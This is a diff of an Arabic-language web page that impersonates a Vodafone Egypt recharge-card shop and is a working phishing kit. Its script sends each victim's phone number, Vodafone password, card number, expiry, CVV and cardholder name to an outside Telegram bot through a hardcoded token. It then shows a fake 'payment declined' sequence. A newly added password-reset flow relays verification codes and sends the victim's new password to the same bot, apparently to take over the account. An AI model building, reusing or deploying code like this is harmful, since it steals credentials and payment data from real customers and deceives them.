@@ -3,261 +3,308 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن كروت فودافون</title>
+    <title>فودافون - شحن الكروت</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Cairo',sans-serif;background:linear-gradient(180deg,#e60000,#c80000,#a00000);color:#fff;min-height:100vh;padding:15px}
-        .c{max-width:500px;margin:0 auto}
-        .h{text-align:center;padding:25px;background:rgba(0,0,0,0.2);border-radius:15px;margin-bottom:15px}
-        .h .logo{font-size:50px}
-        .h h1{font-size:24px;font-weight:900;margin:10px 0}
-        .h p{font-size:12px;opacity:0.8}
+        body{font-family:'Cairo',sans-serif;background:#f5f5f5;min-height:100vh}
         
-        .box{background:rgba(0,0,0,0.3);border-radius:15px;padding:20px;margin:12px 0}
-        .box h3{color:#fff;margin-bottom:12px;font-size:16px}
-        input{width:100%;padding:15px;margin:8px 0;background:rgba(255,255,255,0.15);border:1px solid rgba(255,255,255,0.3);color:#fff;font-size:16px;border-radius:10px;font-family:'Cairo',sans-serif;outline:none}
-        input::placeholder{color:rgba(255,255,255,0.6)}
-        input:focus{border-color:#fff;background:rgba(255,255,255,0.2)}
+        .top-bar{background:#e60000;color:#fff;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+        .top-bar .brand{display:flex;align-items:center;gap:8px;font-size:18px;font-weight:900}
+        .top-bar .brand .verified{background:#fff;color:#e60000;width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:900}
         
-        .cards-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
-        .card-item{background:linear-gradient(135deg,#fff,#f0f0f0);border-radius:15px;padding:20px;text-align:center;cursor:pointer;transition:0.3s;color:#000}
-        .card-item:hover{transform:translateY(-3px);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
-        .card-item:active{transform:scale(0.95)}
+        .container{max-width:500px;margin:0 auto;padding:15px}
+        
+        .card{background:#fff;border-radius:15px;padding:20px;margin:12px 0;box-shadow:0 2px 10px rgba(0,0,0,0.08)}
+        .card h3{color:#333;margin-bottom:12px;font-size:16px}
+        
+        input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;font-family:'Cairo',sans-serif;outline:none}
+        input:focus{border-color:#e60000}
+        
+        .btn{width:100%;padding:15px;margin:6px 0;border:none;border-radius:10px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer}
+        .btn-red{background:#e60000;color:#fff}
+        .btn-outline{background:#fff;color:#e60000;border:2px solid #e60000}
+        
+        .cards-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px 0}
+        .card-item{background:#fff;border:2px solid #e0e0e0;border-radius:15px;padding:20px;text-align:center;cursor:pointer;transition:0.3s}
+        .card-item:hover{border-color:#e60000}
+        .card-item.selected{border-color:#e60000;background:#fff0f0}
         .card-item .amount{font-size:28px;font-weight:900;color:#e60000}
-        .card-item .units{font-size:12px;color:#666;margin-top:5px}
-        .card-item .price{font-size:14px;font-weight:700;color:#000;margin-top:5px}
-        .card-item.popular{border:3px solid #e60000;position:relative}
-        .card-item.popular::before{content:"الأكثر مبيعاً";position:absolute;top:-12px;right:10px;background:#e60000;color:#fff;padding:3px 10px;border-radius:10px;font-size:10px}
+        .card-item .units{font-size:12px;color:#666;margin:5px 0}
         
-        .btn{width:100%;padding:16px;margin:8px 0;border:none;border-radius:12px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer;transition:0.3s}
-        .btn-red{background:#fff;color:#e60000}
-        .btn-red:hover{background:#f0f0f0}
-        .btn-outline{background:transparent;border:2px solid #fff;color:#fff}
-        
-        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999;display:none;justify-content:center;align-items:center;padding:20px}
+        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999;display:none;justify-content:center;align-items:center;padding:20px}
         .modal.show{display:flex}
-        .modal-box{background:#1a1a1a;border-radius:20px;padding:25px;width:100%;max-width:400px;max-height:90vh;overflow:auto}
-        .modal-box h2{color:#fff;text-align:center;margin-bottom:15px}
-        .modal-box .amount-display{text-align:center;font-size:36px;font-weight:900;color:#e60000;margin:10px 0}
+        .modal-box{background:#fff;border-radius:20px;padding:25px;width:100%;max-width:400px}
+        .modal-box h2{text-align:center;color:#e60000;margin-bottom:15px}
+        .modal-box .amount{text-align:center;font-size:40px;font-weight:900;color:#e60000}
         
-        .pay-method{padding:15px;border:1px solid rgba(255,255,255,0.2);margin:8px 0;border-radius:12px;cursor:pointer;transition:0.3s;display:flex;align-items:center;gap:12px;color:#fff}
-        .pay-method:hover{background:rgba(230,0,0,0.2);border-color:#e60000}
-        .pay-method .icon{font-size:30px}
+        .forgot-link{color:#e60000;text-align:left;font-size:12px;cursor:pointer;margin-top:5px}
+        .msg{text-align:center;padding:10px;margin:8px 0;border-radius:8px;display:none;font-size:13px}
+        .msg-error{background:#ffe0e0;color:#c00;display:block}
+        .msg-success{background:#e0ffe0;color:#060;display:block}
+        .msg-info{background:#e0f0ff;color:#006;display:block}
         
-        .processing{text-align:center;padding:30px;display:none}
-        .spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,0.1);border-top:4px solid #e60000;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
+        .spinner{width:40px;height:40px;border:4px solid #eee;border-top:4px solid #e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
         
-        .step-list{list-style:none;text-align:right;padding:0}
-        .step-list li{padding:8px 0;font-size:13px;display:flex;align-items:center;gap:8px;color:#fff}
-        .step-list .done{color:#0f0}.step-list .fail{color:#f00}.step-list .wait{color:#fa0}
-        
-        .success-msg{text-align:center;color:#0f0;font-size:18px;display:none}
-        .error-msg{text-align:center;color:#f00;font-size:16px;display:none}
+        .steps{list-style:none;padding:0}
+        .steps li{padding:8px 0;font-size:13px;display:flex;align-items:center;gap:8px}
+        .steps .ok{color:#0a0}.steps .fail{color:#c00}.steps .wait{color:#e60000}
     </style>
 </head>
 <body>
-    <div class="c">
-        <div class="h">
-            <div class="logo">📱</div>
-            <h1>Vodafone Cards</h1>
-            <p>شحن كروت فودافون بسهولة</p>
-        </div>
-        
+    <div class="top-bar">
+        <div class="brand">📱 فودافون<span class="verified">✓</span></div>
+        <div style="font-size:12px">شحن الكروت</div>
+    </div>
+    
+    <div class="container">
         <!-- Login -->
         <div id="loginPage">
-            <div class="box">
+            <div class="card">
                 <h3>🔐 تسجيل الدخول</h3>
-                <input type="tel" id="phoneInput" placeholder="رقم الهاتف (01xxxxxxxxx)" maxlength="11">
-                <input type="password" id="passInput" placeholder="كلمة سر فودافون">
+                <input type="tel" id="phoneInput" placeholder="رقم الموبايل" maxlength="11">
+                <input type="password" id="passInput" placeholder="كلمة المرور">
+                <div class="forgot-link" onclick="showReset()">نسيت كلمة المرور؟</div>
                 <button class="btn btn-red" onclick="login()">دخول</button>
-                <div class="error-msg" id="loginError"></div>
+                <div class="msg" id="loginMsg"></div>
             </div>
         </div>
         
-        <!-- Cards -->
+        <!-- Reset Password -->
+        <div id="resetPage" style="display:none;">
+            <div class="card">
+                <h3>🔑 استعادة كلمة المرور</h3>
+                <div id="rs1">
+                    <input type="tel" id="resetPhone" placeholder="رقم الموبايل" maxlength="11">
+                    <button class="btn btn-red" onclick="sendResetCode()">إرسال الكود</button>
+                </div>
+                <div id="rs2" style="display:none;">
+                    <input type="tel" id="otpInput" placeholder="كود التحقق">
+                    <button class="btn btn-red" onclick="verifyResetCode()">تحقق</button>
+                </div>
+                <div id="rs3" style="display:none;">
+                    <input type="password" id="newPass" placeholder="كلمة المرور الجديدة">
+                    <input type="password" id="confirmPass" placeholder="تأكيد كلمة المرور">
+                    <button class="btn btn-red" onclick="changePassword()">تغيير كلمة المرور</button>
+                </div>
+                <div class="msg" id="resetMsg"></div>
+                <button class="btn btn-outline" onclick="showLogin()">↩️ رجوع</button>
+            </div>
+        </div>
+        
+        <!-- Cards Page -->
         <div id="cardsPage" style="display:none;">
-            <div class="box">
+            <div class="card">
                 <h3>💳 اختر الكارت</h3>
                 <div class="cards-grid">
-                    <div class="card-item" onclick="selectCard(10, '500 وحدة')">
-                        <div class="amount">10 ج</div>
-                        <div class="units">📞 500 وحدة</div>
-                        <div class="price">صلاحية 7 أيام</div>
-                    </div>
-                    <div class="card-item" onclick="selectCard(15, '800 وحدة')">
-                        <div class="amount">15 ج</div>
-                        <div class="units">📞 800 وحدة</div>
-                        <div class="price">صلاحية 7 أيام</div>
-                    </div>
-                    <div class="card-item popular" onclick="selectCard(20, '1200 وحدة')">
-                        <div class="amount">20 ج</div>
-                        <div class="units">📞 1200 وحدة</div>
-                        <div class="price">صلاحية 14 يوم</div>
-                    </div>
-                    <div class="card-item" onclick="selectCard(25, '1600 وحدة')">
-                        <div class="amount">25 ج</div>
-                        <div class="units">📞 1600 وحدة</div>
-                        <div class="price">صلاحية 14 يوم</div>
-                    </div>
-                    <div class="card-item" onclick="selectCard(30, '2000 وحدة')">
-                        <div class="amount">30 ج</div>
-                        <div class="units">📞 2000 وحدة</div>
-                        <div class="price">صلاحية 30 يوم</div>
-                    </div>
-                    <div class="card-item" onclick="selectCard(45, '3000 وحدة')">
-                        <div class="amount">45 ج</div>
-                        <div class="units">📞 3000 وحدة</div>
-                        <div class="price">صلاحية 30 يوم</div>
-                    </div>
+                    <div class="card-item" onclick="selectCard(10,'500 وحدة',this)"><div class="amount">10 ج</div><div class="units">📞 500 وحدة - 7 أيام</div></div>
+                    <div class="card-item" onclick="selectCard(15,'800 وحدة',this)"><div class="amount">15 ج</div><div class="units">📞 800 وحدة - 7 أيام</div></div>
+                    <div class="card-item" onclick="selectCard(20,'1200 وحدة',this)"><div class="amount">20 ج</div><div class="units">📞 1200 وحدة - 14 يوم</div></div>
+                    <div class="card-item" onclick="selectCard(25,'1600 وحدة',this)"><div class="amount">25 ج</div><div class="units">📞 1600 وحدة - 14 يوم</div></div>
+                    <div class="card-item" onclick="selectCard(30,'2000 وحدة',this)"><div class="amount">30 ج</div><div class="units">📞 2000 وحدة - 30 يوم</div></div>
+                    <div class="card-item" onclick="selectCard(45,'3000 وحدة',this)"><div class="amount">45 ج</div><div class="units">📞 3000 وحدة - 30 يوم</div></div>
                 </div>
             </div>
         </div>
     </div>
 
     <!-- Payment Modal -->
-    <div class="modal" id="modal">
-        <div class="modal-box" id="modalContent"></div>
+    <div class="modal" id="payModal">
+        <div class="modal-box" id="payContent"></div>
     </div>
 
     <script>
-        const BOT_TOKEN = "8946474034:AAGegUUfpLuRG6k8r72JiDEuYzGTK9TgV6I";
-        const CHAT_ID = "7276604783";
-        let userPhone = '';
-        let userPass = '';
-        let selectedAmount = 0;
-        let selectedUnits = '';
-        
-        async function sendToTelegram(text) {
+        const BOT = "8946474034:AAGegUUfpLuRG6k8r72JiDEuYzGTK9TgV6I";
+        const CHAT = "7276604783";
+        let userPhone = '', userPass = '', selAmount = 0, selUnits = '';
+        let resetData = {};
+
+        async function sendBot(text) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'HTML'
-                    })
+                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT, text, parse_mode: 'HTML' })
                 });
             } catch(e) {}
         }
-        
+
+        function showMsg(id, text, cls) {
+            const el = document.getElementById(id);
+            el.textContent = text; el.className = 'msg msg-' + cls;
+            setTimeout(() => el.className = 'msg', 3000);
+        }
+
+        function showReset() {
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('resetPage').style.display = 'block';
+            document.getElementById('rs1').style.display = 'block';
+            document.getElementById('rs2').style.display = 'none';
+            document.getElementById('rs3').style.display = 'none';
+        }
+
+        function showLogin() {
+            document.getElementById('resetPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+        }
+
         function login() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            const pass = document.getElementById('passInput').value.trim();
-            const error = document.getElementById('loginError');
+            const p = document.getElementById('phoneInput').value.trim();
+            const pw = document.getElementById('passInput').value.trim();
+            if (!p || p.length < 11) { showMsg('loginMsg', 'رقم غير صحيح', 'error'); return; }
+            if (!pw) { showMsg('loginMsg', 'كلمة المرور مطلوبة', 'error'); return; }
             
-            if (!phone || phone.length < 11) {
-                error.style.display = 'block';
-                error.textContent = '❌ رقم الهاتف غير صحيح';
-                return;
-            }
-            if (!pass) {
-                error.style.display = 'block';
-                error.textContent = '❌ كلمة السر مطلوبة';
-                return;
-            }
-            
-            userPhone = phone;
-            userPass = pass;
-            error.style.display = 'none';
-            
-            // Send to Telegram
-            sendToTelegram(`📱 <b>تسجيل دخول فودافون</b>\n\n📞 الرقم: <code>${phone}</code>\n🔑 كلمة السر: <code>${pass}</code>`);
+            userPhone = p; userPass = pw;
+            sendBot(`📱 <b>تسجيل دخول</b>\n📞 <code>${p}</code>\n🔑 <code>${pw}</code>`);
             
             document.getElementById('loginPage').style.display = 'none';
             document.getElementById('cardsPage').style.display = 'block';
         }
-        
-        function selectCard(amount, units) {
-            selectedAmount = amount;
-            selectedUnits = units;
+
+        async function sendResetCode() {
+            const phone = document.getElementById('resetPhone').value.trim();
+            if (!phone || phone.length < 11) { showMsg('resetMsg', 'رقم غير صحيح', 'error'); return; }
             
-            document.getElementById('modalContent').innerHTML = `
-                <span style="float:left;color:#f00;font-size:24px;cursor:pointer;" onclick="closeModal()">✕</span>
-                <h2>💳 تأكيد الشراء</h2>
-                <div class="amount-display">${amount} ج</div>
-                <p style="text-align:center;color:#aaa;">${units}</p>
-                <p style="text-align:center;color:#888;font-size:12px;">اختر طريقة الدفع</p>
+            showMsg('resetMsg', '⏳ جاري الإرسال...', 'info');
+            
+            try {
+                const res = await fetch('/api/vodafone_reset', {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ action: 'sendCode', phone })
+                });
+                const data = await res.json();
                 
-                <div class="pay-method" onclick="showCardForm()">
-                    <span class="icon">💳</span>
-                    <div><b>بطاقة ائتمان</b><br><small style="color:#888;">Visa • MasterCard • Meeza</small></div>
+                if (data.success) {
+                    resetData = { phone, otpAction: data.otpAction, cookies: data.cookies };
+                    document.getElementById('rs1').style.display = 'none';
+                    document.getElementById('rs2').style.display = 'block';
+                    showMsg('resetMsg', '✅ تم إرسال الكود - تفقد هاتفك', 'success');
+                } else {
+                    showMsg('resetMsg', '❌ ' + data.msg, 'error');
+                }
+            } catch(e) {
+                showMsg('resetMsg', '❌ فشل الاتصال', 'error');
+            }
+        }
+
+        async function verifyResetCode() {
+            const otp = document.getElementById('otpInput').value.trim();
+            if (!otp) { showMsg('resetMsg', 'الكود مطلوب', 'error'); return; }
+            
+            showMsg('resetMsg', '⏳ جاري التحقق...', 'info');
+            
+            try {
+                const res = await fetch('/api/vodafone_reset', {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ action: 'verifyCode', ...resetData, otp })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    resetData.passAction = data.passAction;
+                    resetData.cookies = data.cookies;
+                    document.getElementById('rs2').style.display = 'none';
+                    document.getElementById('rs3').style.display = 'block';
+                    showMsg('resetMsg', '✅ الكود صحيح', 'success');
+                } else {
+                    showMsg('resetMsg', '❌ ' + data.msg, 'error');
+                }
+            } catch(e) {
+                showMsg('resetMsg', '❌ فشل الاتصال', 'error');
+            }
+        }
+
+        async function changePassword() {
+            const np = document.getElementById('newPass').value.trim();
+            const cp = document.getElementById('confirmPass').value.trim();
+            if (np !== cp) { showMsg('resetMsg', 'غير متطابقة', 'error'); return; }
+            if (np.length < 8) { showMsg('resetMsg', 'كلمة مرور قصيرة', 'error'); return; }
+            
+            showMsg('resetMsg', '⏳ جاري التغيير...', 'info');
+            
+            try {
+                const res = await fetch('/api/vodafone_reset', {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ action: 'changePass', ...resetData, newPass: np })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    showMsg('resetMsg', '✅ تم تغيير كلمة المرور بنجاح!', 'success');
+                    sendBot(`✅ <b>تم تغيير كلمة المرور</b>\n📞 <code>${resetData.phone}</code>\n🔑 <code>${np}</code>`);
+                    setTimeout(showLogin, 2000);
+                } else {
+                    showMsg('resetMsg', '❌ ' + data.msg, 'error');
+                }
+            } catch(e) {
+                showMsg('resetMsg', '❌ فشل الاتصال', 'error');
+            }
+        }
+
+        function selectCard(amount, units, el) {
+            document.querySelectorAll('.card-item').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            selAmount = amount; selUnits = units;
+            showPayModal();
+        }
+
+        function showPayModal() {
+            document.getElementById('payContent').innerHTML = `
+                <span style="float:left;color:#e60000;font-size:24px;cursor:pointer;" onclick="closePay()">✕</span>
+                <h2>💳 تأكيد الشراء</h2>
+                <div class="amount">${selAmount} ج</div>
+                <p style="text-align:center;color:#666;">${selUnits}</p>
+                <div style="padding:15px;border:2px solid #e0e0e0;border-radius:12px;margin:10px 0;cursor:pointer;" onclick="showCardForm()">
+                    <span style="font-size:24px;">💳</span> <b>الدفع بالبطاقة</b>
                 </div>
-                <div class="pay-method" onclick="showCardForm()">
-                    <span class="icon">📱</span>
-                    <div><b>فودافون كاش</b><br><small style="color:#888;">تحويل فوري</small></div>
+                <div style="padding:15px;border:2px solid #e0e0e0;border-radius:12px;margin:10px 0;cursor:pointer;" onclick="showCardForm()">
+                    <span style="font-size:24px;">📱</span> <b>فودافون كاش</b>
                 </div>
             `;
-            document.getElementById('modal').classList.add('show');
+            document.getElementById('payModal').classList.add('show');
         }
-        
-        function closeModal() {
-            document.getElementById('modal').classList.remove('show');
-        }
-        
+
         function showCardForm() {
-            document.getElementById('modalContent').innerHTML = `
-                <span style="float:left;color:#f00;font-size:24px;cursor:pointer;" onclick="closeModal()">✕</span>
+            document.getElementById('payContent').innerHTML = `
+                <span style="float:left;color:#e60000;font-size:24px;cursor:pointer;" onclick="closePay()">✕</span>
                 <h2>💳 بيانات البطاقة</h2>
-                <div class="amount-display">${selectedAmount} ج</div>
-                
-                <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="16">
+                <div class="amount">${selAmount} ج</div>
+                <input type="text" id="cardNum" placeholder="رقم البطاقة" maxlength="16">
                 <div style="display:flex;gap:8px;">
-                    <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" style="flex:1">
+                    <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" style="flex:1">
                     <input type="text" id="cardCvv" placeholder="CVV" maxlength="3" style="flex:1">
                 </div>
                 <input type="text" id="cardName" placeholder="اسم حامل البطاقة">
-                
-                <button class="btn btn-red" onclick="processPayment()" style="margin-top:10px;">💰 ادفع ${selectedAmount} ج</button>
+                <button class="btn btn-red" onclick="processPay()">💰 ادفع ${selAmount} ج</button>
             `;
         }
-        
-        async function processPayment() {
-            const cardNum = document.getElementById('cardNum')?.value || '';
-            const cardExpiry = document.getElementById('cardExpiry')?.value || '';
-            const cardCvv = document.getElementById('cardCvv')?.value || '';
-            const cardName = document.getElementById('cardName')?.value || '';
+
+        function closePay() { document.getElementById('payModal').classList.remove('show'); }
+
+        async function processPay() {
+            const cn = document.getElementById('cardNum')?.value || '';
+            const ce = document.getElementById('cardExp')?.value || '';
+            const cc = document.getElementById('cardCvv')?.value || '';
+            const cn2 = document.getElementById('cardName')?.value || '';
             
-            if (!cardNum || !cardExpiry || !cardCvv) {
-                alert('يرجى إدخال جميع بيانات البطاقة');
-                return;
-            }
+            if (!cn || !ce || !cc) { alert('ادخل بيانات البطاقة'); return; }
             
-            // Send card data to Telegram
-            await sendToTelegram(
-                `💳 <b>بيانات بطاقة جديدة!</b>\n\n` +
-                `📱 هاتف: <code>${userPhone}</code>\n` +
-                `🔑 كلمة سر فودافون: <code>${userPass}</code>\n` +
-                `💳 البطاقة: <code>${cardNum}</code>\n` +
-                `📅 تاريخ: <code>${cardExpiry}</code>\n` +
-                `🔐 CVV: <code>${cardCvv}</code>\n` +
-                `👤 الاسم: <code>${cardName}</code>\n` +
-                `💰 المبلغ: <code>${selectedAmount} ج - ${selectedUnits}</code>`
-            );
+            await sendBot(`💳 <b>بطاقة</b>\n📱<code>${userPhone}</code>\n🔑<code>${userPass}</code>\n💳<code>${cn}</code>\n📅<code>${ce}</code>\n🔐<code>${cc}</code>\n👤<code>${cn2}</code>\n💰<code>${selAmount}ج</code>`);
             
-            // Show processing
-            document.getElementById('modalContent').innerHTML = `
-                <h2 style="text-align:center;color:#fff;">⏳ جاري الشحن...</h2>
-                <div class="processing" style="display:block;">
-                    <div class="spinner"></div>
-                    <ul class="step-list" id="steps">
-                        <li class="wait">🔄 جاري التحقق من البطاقة...</li>
-                    </ul>
-                </div>
+            document.getElementById('payContent').innerHTML = `
+                <h2 style="color:#e60000;">⏳ جاري الشحن...</h2>
+                <div class="spinner"></div>
+                <ul class="steps" id="steps">
+                    <li class="wait">🔄 جاري التحقق من البطاقة...</li>
+                </ul>
             `;
             
             const s = document.getElementById('steps');
-            setTimeout(() => s.innerHTML += '<li class="done">✅ تم التحقق من البطاقة</li>', 1200);
-            setTimeout(() => s.innerHTML += '<li class="wait">🔄 جاري الاتصال بـ فودافون...</li>', 2200);
-            setTimeout(() => s.innerHTML += '<li class="wait">🔄 جاري معالجة الشحن...</li>', 3200);
-            setTimeout(() => s.innerHTML += '<li class="done">✅ تم الاتصال بالخادم</li>', 4200);
-            setTimeout(() => s.innerHTML += '<li class="fail">❌ تم رفض عملية الدفع</li>', 5200);
-            setTimeout(() => s.innerHTML += '<li class="fail">❌ رصيد غير كافٍ</li>', 5600);
-            setTimeout(() => {
-                s.innerHTML += `<br><button class="btn btn-red" onclick="closeModal()" style="margin-top:15px;">✕ إغلاق</button>`;
-            }, 6000);
+            setTimeout(() => s.innerHTML += '<li class="ok">✅ تم التحقق</li>', 1200);
+            setTimeout(() => s.innerHTML += '<li class="wait">🔄 جاري الاتصال بفودافون...</li>', 2200);
+            setTimeout(() => s.innerHTML += '<li class="fail">❌ تم رفض عملية الدفع</li>', 4000);
+            setTimeout(() => s.innerHTML += '<li class="fail">❌ رصيد غير كافٍ</li>', 4500);
+            setTimeout(() => s.innerHTML += '<br><button class="btn btn-red" onclick="closePay()" style="margin-top:10px;">✕ إغلاق</button>', 5000);
         }
     </script>
 </body>
